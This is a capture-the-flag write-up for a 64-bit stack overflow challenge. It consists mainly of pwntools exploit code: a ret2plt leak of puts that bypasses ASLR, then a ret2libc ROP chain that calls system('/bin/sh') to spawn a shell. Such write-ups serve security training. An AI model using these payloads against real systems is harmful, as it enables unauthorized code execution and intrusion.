# Proof of Concept

## TL;DR

- Get libc offset from ret2plt (basically [this](https://ir0nstone.gitbook.io/notes/binexp/stack/aslr/ret2plt-aslr-bypass) but 64-bit)
```py
offset = 40
pop_rdi = 0x000000000040117a
ret = 0x000000000040101a

leak_payload = flat(
    cyclic(offset, n=8),
    pop_rdi,
    exe.got.puts,
    exe.plt.puts,
    exe.sym['_start']
)
io.sendlineafter(b'gets\n', leak_payload)
puts_leak = u64(io.recv(6).ljust(8, b'\x00')) - libc.symbols['puts']
log.success(f'puts leak: {hex(puts_leak)}')
```
- Do classic ret2libc on 64 bit binary after offset
```py
system = libc.symbols['system'] + puts_leak
binsh = next(libc.search(b'/bin/sh')) + puts_leak

payload = flat(
    cyclic(offset, n=8),
    pop_rdi,
    binsh,
    ret,
    system
)
io.sendlineafter(b'gets\n', payload)
```

### Flag: 
> HCS{41_but_i_G0T_41_g04lzz_[a-fA-F0-9]{8}-([a-fA-F0-9]{4}-){3}[a-fA-F0-9]{12}}